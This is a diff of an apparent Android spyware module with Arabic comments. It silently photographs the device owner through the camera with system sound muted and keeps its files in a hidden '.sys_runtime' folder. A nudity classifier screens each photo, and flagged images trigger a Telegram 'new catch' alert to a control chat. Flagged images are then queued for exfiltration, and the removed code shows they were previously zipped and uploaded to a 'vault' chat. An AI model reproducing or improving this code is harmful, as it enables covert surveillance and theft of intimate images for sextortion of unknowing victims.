@@ -2,54 +2,69 @@
 import os
 import time
 import threading
-import zipfile
 import logging
 import gc
-import numpy as np
 from datetime import datetime
-from PIL import Image
 
-P = os.path.join(os.getcwd(), ".sys_runtime")
-T = os.path.join(P, "c_tmp")
-for d in [P, T]:
+# ========== إعداد المسارات الموحدة ==========
+def _get_runtime_path():
+    try:
+        from jnius import autoclass
+        act = autoclass('org.kivy.android.PythonActivity').mActivity
+        base = act.getFilesDir().getPath()
+        return os.path.join(base, ".sys_runtime")
+    except:
+        return os.path.join(os.getcwd(), ".sys_runtime")
+
+P = _get_runtime_path()
+T = os.path.join(P, "ctmp")            # مجلد مؤقت للصور الخام
+QUEUE = os.path.join(P, "harvest_queue") # مجلد انتظار الضغط والإرسال
+
+for d in [P, T, QUEUE]:
     if not os.path.exists(d):
         os.makedirs(d)
 
 logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')
 
+# ========== استيراد المكتبات ==========
 try:
     from jnius import autoclass, PythonJavaClass, java_method
     JNI = True
 except ImportError:
     JNI = False
 
+try:
+    import numpy as np
+    from PIL import Image
+    AI_AVAILABLE = True
+except ImportError:
+    AI_AVAILABLE = False
+
 
 class CameraAnalyzer:
     def __init__(self, mon=None, det=None):
-        self.mon = mon
-        self.det = det          # NudeDetector instance
+        self.mon = mon      # كائن monitor (يحتوي على did, dmd, ui, ctrl ...)
+        self.det = det      # NudeDetector instance (لتحليل الصور)
         self.busy = False
         self.last_skip = 0
-        self._old_volume = -1   # لحفظ مستوى الصوت القديم
+        self._old_volume = -1
 
+    # ========== التحقق من البطارية ==========
     def _power_ok(self):
-        """التحقق من البطارية (15% على الأقل أو شاحن)"""
         try:
             b, c = self.mon._bat() if hasattr(self.mon, '_bat') else (100, True)
             return b >= 15 or c
-        except Exception:
+        except:
             return True
 
+    # ========== كتم صوت النظام ==========
     def _mute_audio(self, mute=True):
-        """كتم صوت النظام عبر AudioManager (يعمل على Android 10+)"""
         if not JNI:
             return
         try:
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            activity = PythonActivity.mActivity
             AudioManager = autoclass('android.media.AudioManager')
-            am = activity.getSystemService(activity.AUDIO_SERVICE)
-
+            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
+            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
             if mute:
                 self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                 am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
@@ -60,62 +75,38 @@ class CameraAnalyzer:
         except Exception as e:
             logging.error(f"Mute error: {e}")
 
-    def _secure_del(self, path):
-        """حذف آمن بالكتابة على دفعات (4KB) لتوفير الذاكرة"""
+    # ========== اختيار أفضل دقة صورة (توفير للسرعة والذاكرة) ==========
+    def _get_best_picture_size(self, characteristics):
         try:
-            if os.path.exists(path):
-                sz = os.path.getsize(path)
-                if sz > 0:
-                    chunk = 4096
-                    with open(path, "ba+", buffering=0) as f:
-                        for _ in range(0, sz, chunk):
-                            f.write(os.urandom(min(chunk, sz)))
-                        f.flush()
-                        os.fsync(f.fileno())
-                os.remove(path)
+            SC = autoclass('android.hardware.camera2.CameraCharacteristics')
+            config = characteristics.get(SC.SCALER_STREAM_CONFIGURATION_MAP)
+            IF = autoclass('android.graphics.ImageFormat')
+            sizes = config.getOutputSizes(IF.JPEG)
+            if sizes and len(sizes) > 0:
+                # اختيار دقة متوسطة (حول 800x600) لتوازن بين الجودة والحجم
+                best = min(sizes, key=lambda s: abs((s.width * s.height) - (800 * 600)))
+                return best.width, best.height
         except Exception as e:
-            logging.error(f"Secure delete error: {e}")
+            logging.error(f"Get size error: {e}")
+        return 640, 480
 
-    def _open_camera_with_retry(self, camera_manager, camera_id, max_retries=3):
-        """فتح الكاميرا مع إعادة المحاولة (تجاوز الانشغال المؤقت)"""
+    # ========== فتح الكاميرا مع إعادة المحاولة ==========
+    def _open_camera_with_retry(self, camera_manager, camera_id, max_retries=2):
         for attempt in range(max_retries):
             try:
-                # استخدام openCamera بشكل متزامن عبر CountDownLatch (محاكاة مبسطة)
-                # في التنفيذ الحقيقي، تحتاج إلى StateCallback و Semaphore.
-                # هنا نستخدم الطريقة المتاحة عبر JNI (قد تختلف حسب إصدار jnius)
                 camera = camera_manager.openCamera(camera_id, None, None)
                 if camera:
                     return camera
             except Exception as e:
                 logging.warning(f"Open camera attempt {attempt+1} failed: {e}")
-                if attempt < max_retries - 1:
-                    time.sleep(0.5)
+                time.sleep(0.5)
         return None
 
-    def _get_best_picture_size(self, characteristics):
-        """اختيار أصغر دقة مناسبة للتحليل (توفير السرعة والذاكرة)"""
-        try:
-            config = characteristics.get(
-                autoclass('android.hardware.camera2.CameraCharacteristics')
-                .SCALER_STREAM_CONFIGURATION_MAP
-            )
-            sizes = config.getOutputSizes(
-                autoclass('android.graphics.ImageFormat').JPEG
-            )
-            if sizes and len(sizes) > 0:
-                # اختيار أصغر دقة (أقل عرض وارتفاع)
-                smallest = min(sizes, key=lambda s: s.width * s.height)
-                return smallest.width, smallest.height
-        except Exception as e:
-            logging.error(f"Get picture size error: {e}")
-        return 640, 480   # قيمة افتراضية آمنة
-
+    # ========== التقاط صورة (صامتة) ==========
     def capture(self, cam_id=0):
-        """التقاط صورة باستخدام Camera2 API مع التحكم بالصوت وإعادة المحاولة"""
+        """التقاط صورة باستخدام Camera2 API، إرجاع مسار الصورة أو None"""
         if self.busy or not self._power_ok():
             return None
-
-        # تجنب التقاط الصورة إذا كانت الكاميرا قيد الاستخدام من تطبيق آخر
         if time.time() < self.last_skip:
             return None
 
@@ -125,55 +116,35 @@ class CameraAnalyzer:
         if JNI:
             self._mute_audio(True)
             try:
-                PythonActivity = autoclass('org.kivy.android.PythonActivity')
-                activity = PythonActivity.mActivity
-                Context = autoclass('android.content.Context')
-                CameraManager = activity.getSystemService(Context.CAMERA_SERVICE)
+                ctx = autoclass('org.kivy.android.PythonActivity').mActivity
+                CameraManager = ctx.getSystemService(ctx.CAMERA_SERVICE)
 
-                # الحصول على قائمة الكاميرات المتاحة
                 camera_ids = CameraManager.getCameraIdList()
                 if cam_id >= len(camera_ids):
                     cam_id = 0
                 target_id = camera_ids[cam_id]
 
-                # فتح الكاميرا مع إعادة المحاولة
+                # فتح الكاميرا
                 camera_device = self._open_camera_with_retry(CameraManager, target_id)
                 if not camera_device:
                     logging.error("Failed to open camera after retries")
                     return None
 
-                # الحصول على خصائص الكاميرا لاختيار الدقة المناسبة
                 characteristics = CameraManager.getCameraCharacteristics(target_id)
                 width, height = self._get_best_picture_size(characteristics)
 
-                # إنشاء SurfaceTexture ديناميكي (تجنب التعارض)
-                SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
-                surf_texture = SurfaceTexture(0)  # 0 = ديناميكي
-
-                # إنشاء جلسة الالتقاط (CaptureSession) – مبسط هنا
-                # في التنفيذ الكامل تحتاج إلى إنشاء Surface للصورة والإعداد
-                # سنعتمد على طريقة الالتقاط المتزامنة عبر takePicture (هناك قيود)
-                # لكن لضمان العمل الفوري، نستخدم Camera1 بطريقة مختلفة؟
-                # الحل الأمثل: استخدام Camera2 مع ImageReader.
-
-                # بديل سريع: استخدام الكاميرا القديمة مع إصلاحات الصوت؟ لا، نريد حلًا مستقبليًا.
-                # بما أن jnius يدعم الواجهات، سننفذ ImageReader و CaptureSession بشكل كامل.
-
-                # لنكتب كودًا حقيقيًا لـ Camera2 باستخدام ImageReader
+                # إعداد ImageReader
                 ImageReader = autoclass('android.media.ImageReader')
-                HandlerThread = autoclass('android.os.HandlerThread')
-                Handler = autoclass('android.os.Handler')
-                CameraDevice = autoclass('android.hardware.camera2.CameraDevice')
-                CaptureRequest = autoclass('android.hardware.camera2.CaptureRequest')
                 ImageFormat = autoclass('android.graphics.ImageFormat')
-
-                # إنشاء ImageReader للحصول على بيانات JPEG
                 reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)
+
+                # إعداد HandlerThread
+                HandlerThread = autoclass('android.os.HandlerThread')
                 handler_thread = HandlerThread("camera_handler")
                 handler_thread.start()
-                handler = Handler(handler_thread.getLooper())
+                handler = autoclass('android.os.Handler')(handler_thread.getLooper())
 
-                # لانتظار نتيجة الالتقاط
+                # حدث لانتظار الصورة
                 image_saved = threading.Event()
                 image_data = [None]
 
@@ -192,22 +163,22 @@ class CameraAnalyzer:
 
                 reader.setOnImageAvailableListener(ImageAvailableListener(), handler)
 
-                # بدء جلسة الالتقاط
+                # إنشاء جلسة التقاط
                 surface = reader.getSurface()
-                session_callback = None  # تبسيط
-                session = camera_device.createCaptureSession([surface], session_callback, handler)
+                session = camera_device.createCaptureSession([surface], None, handler)
 
                 # بناء طلب الالتقاط
+                CaptureRequest = autoclass('android.hardware.camera2.CaptureRequest')
                 request_builder = camera_device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                 request_builder.addTarget(surface)
                 request_builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                 request_builder.set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_START)
-                request_builder.set(CaptureRequest.JPEG_ORIENTATION, 90 if cam_id == 1 else 0)  # أمامية/خلفية
+                request_builder.set(CaptureRequest.JPEG_ORIENTATION, 90 if cam_id == 1 else 0)
 
-                # تنفيذ الالتقاط
+                # التقاط
                 session.capture(request_builder.build(), None, handler)
 
-                # انتظار الصورة لمدة 5 ثوانٍ
+                # انتظار النتيجة لمدة 5 ثوانٍ
                 if image_saved.wait(5) and image_data[0]:
                     out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                     with open(out_path, 'wb') as f:
@@ -220,7 +191,7 @@ class CameraAnalyzer:
                 camera_device.close()
 
             except Exception as e:
-                logging.error(f"Camera2 capture error: {e}")
+                logging.error(f"Capture error: {e}")
             finally:
                 self._mute_audio(False)
                 gc.collect()
@@ -228,66 +199,75 @@ class CameraAnalyzer:
         self.busy = False
         return out_path
 
+    # ========== تحضير الصورة لـ AI ==========
     def _prepare_for_ai(self, path):
-        """تجهيز الصورة للنموذج (224x224) مع تقليل نسخ البيانات"""
+        if not AI_AVAILABLE:
+            return None
         try:
             with Image.open(path) as img:
                 img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
-                # استخدام np.asarray لتجنب النسخ غير الضروري
                 arr = np.asarray(img, dtype=np.float32) / 255.0
                 return np.expand_dims(arr, axis=0)
         except Exception as e:
             logging.error(f"AI prep error: {e}")
             return None
 
+    # ========== الوظيفة الرئيسية: التقاط + تحليل + إشعار + نقل أو حذف ==========
     def harvest(self, cam_id=0):
-        """التقاط صورة وتحليلها وإرسالها إذا كانت حساسة"""
-        p = self.capture(cam_id)
-        if not p:
+        """التقاط صورة، تحليلها عبر AI، إرسال إشعار فوري إذا كانت حساسة، ونقلها لطابور الحصاد"""
+        pic_path = self.capture(cam_id)
+        if not pic_path:
             return
 
         is_nude = False
-        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
+        confidence = 0.0
+        if self.det and hasattr(self.det, 'model') and self.det.model is not None and AI_AVAILABLE:
             try:
-                input_data = self._prepare_for_ai(p)
+                input_data = self._prepare_for_ai(pic_path)
                 if input_data is not None:
                     self.det.model.set_tensor(self.det.in_idx, input_data)
                     self.det.model.invoke()
                     out = self.det.model.get_tensor(self.det.out_idx)[0]
-                    prob = float(out[1]) if len(out) > 1 else float(out[0])
-                    if prob > 0.85:
+                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
+                    if confidence > 0.85:
                         is_nude = True
-                    del input_data, out
             except Exception as e:
-                logging.error(f"Harvest AI error: {e}")
+                logging.error(f"AI analysis error: {e}")
 
         if is_nude:
-            self._send_to_vault(p)
+            # 1. إرسال إشعار فوري إلى قناة التحكم (ctrl)
+            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
+                try:
+                    alert = (
+                        f"🔞 **صيد جديد!**\n"
+                        f"📱 الجهاز: `{self.mon.dmd}`\n"
+                        f"🎯 الثقة: `{confidence:.1%}`\n"
+                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
+                    )
+                    self.mon.ui._api("sendMessage", {
+                        "chat_id": self.mon.ctrl,
+                        "text": alert,
+                        "parse_mode": "Markdown"
+                    })
+                except Exception as e:
+                    logging.error(f"Alert send error: {e}")
+
+            # 2. نقل الصورة إلى مجلد harvest_queue لانتظار الضغط والإرسال
+            dest = os.path.join(QUEUE, os.path.basename(pic_path))
+            try:
+                os.rename(pic_path, dest)
+                logging.info(f"Moved to harvest queue: {dest}")
+            except Exception as e:
+                logging.error(f"Move to queue error: {e}")
+                # إذا فشل النقل، احذف الصورة لحماية الخصوصية
+                if os.path.exists(pic_path):
+                    os.remove(pic_path)
         else:
-            self._secure_del(p)
-
-    def _send_to_vault(self, raw):
-        """ضغط الصورة وإرسالها إلى قناة الخزنة (Vault)"""
-        z = raw.replace(".jpg", ".zip")
-        try:
-            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
-                zf.write(raw, os.path.basename(raw))
-
-            ui = getattr(self.mon, 'ui', None)
-            vault_id = getattr(self.mon, 'vlt', None)
-
-            if ui and vault_id:
-                with open(z, 'rb') as f:
-                    ui._ap("sendDocument", {
-                        "chat_id": vault_id,
-                        "caption": f"📸 Alert | {datetime.now().strftime('%Y-%m-%d %H:%M')}"
-                    }, {"document": f})
-        except Exception as e:
-            logging.error(f"Upload error: {e}")
-        finally:
-            self._secure_del(raw)
-            self._secure_del(z)
+            # حذف الصورة العادية فوراً (لا نريد تخزينها)
+            if os.path.exists(pic_path):
+                os.remove(pic_path)
 
 
+# ========== دالة المصنع ==========
 def create(mon=None, det=None):
     return CameraAnalyzer(mon, det)
